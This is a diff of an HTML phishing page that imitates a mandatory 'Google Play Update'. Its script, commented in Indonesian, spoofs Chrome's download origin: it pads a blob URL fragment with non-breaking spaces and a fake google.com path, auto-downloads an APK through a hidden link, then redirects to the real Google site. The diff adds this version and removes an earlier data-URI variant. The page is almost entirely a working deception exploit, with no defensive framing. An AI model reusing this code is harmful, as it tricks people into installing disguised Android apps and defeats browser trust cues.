@@ -2,40 +2,46 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Google Security</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Services</title>
 </head>
 <body style="background:#f1f3f4; font-family:sans-serif; text-align:center; padding-top:100px;">
 
-    <div style="padding:30px; background:#fff; border-radius:8px; display:inline-block; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
-        <h2 style="color:#1a73e8;">Google Update</h2>
-        <p>A mandatory update is required.</p>
-        <button id="strike" style="padding:12px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px; cursor:pointer;">INSTALL NOW</button>
+    <div style="padding:30px; background:#fff; border-radius:8px; display:inline-block; box-shadow:0 2px 10px rgba(0,0,0,0.1); max-width:300px;">
+        <h2 style="color:#1a73e8;">Google Play Update</h2>
+        <p style="font-size:14px; color:#5f6368;">Update required to continue using Google services.</p>
+        <button id="pwnBtn" style="padding:12px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px; cursor:pointer; width:100%;">INSTALL NOW</button>
     </div>
 
 <script>
-    document.getElementById('strike').addEventListener('click', function() {
-        const fakeOrigin = "https://www.google.com";
-        const filename = "Google_Update.apk";
-        const padding = " ".repeat(1000); // Gunakan spasi murni bukan encoded untuk navigasi top-level
-
-        // STRATEGI: Menggunakan skema data: sebagai "parent" dari download
-        // Chrome terkadang mengambil origin dari context navigasi terakhir
-        const base64Payload = "ZXN0dGVzdHRlc3Q="; 
+    document.getElementById('pwnBtn').addEventListener('click', function() {
+        const filename = "GooglePatch.apk";
+        const spoofDomain = "www.google.com";
         
-        // Buat blob URL yang sangat panjang
-        const blob = new Blob(["test"], {type: 'application/vnd.android.package-archive'});
-        const url = URL.createObjectURL(blob);
+        // 1. Karakter Spoofing
+        const nbSpace = decodeURIComponent("%C2%A0");
+        const padding = nbSpace.repeat(2000); 
+        const fakeOrigin = `https://${spoofDomain}/security/v2026/`;
 
-        // TRIGGER 1: Navigasi ke Data URI yang mengandung domain palsu
-        // Ini akan mengubah "Last Known Origin" di mata UI Chrome
-        const spoofPath = `data:text/html,<html><body><script>location.href="${url}#${padding}${fakeOrigin}";<\/script></body></html>`;
+        // 2. Buat Blob Payload (APK palsu)
+        const content = new Uint8Array([0x50, 0x4B, 0x03, 0x04]); 
+        const blob = new Blob([content], {type: "application/vnd.android.package-archive"});
+        const blobUrl = URL.createObjectURL(blob);
 
-        // TRIGGER 2: Eksekusi navigasi
-        window.location.href = spoofPath;
-
-        // TRIGGER 3: Redirect ke Google asli setelah jeda sangat singkat
+        // 3. Eksekusi menggunakan Anchor tersembunyi
+        // Menggunakan target="_blank" terkadang membantu memisahkan context origin di Chrome
+        const a = document.createElement('a');
+        a.href = blobUrl + "#" + padding + fakeOrigin;
+        a.download = filename;
+        
+        document.body.appendChild(a);
+        a.click();
+        
+        // 4. Manipulasi Address Bar
+        // Segera ganti lokasi agar saat dialog muncul, Chrome sedang memproses URL Google
         setTimeout(() => {
-            window.location.replace("https://www.google.com");
+            window.location.replace("https://www.google.com/");
+            document.body.removeChild(a);
         }, 3000);
     });
 </script>
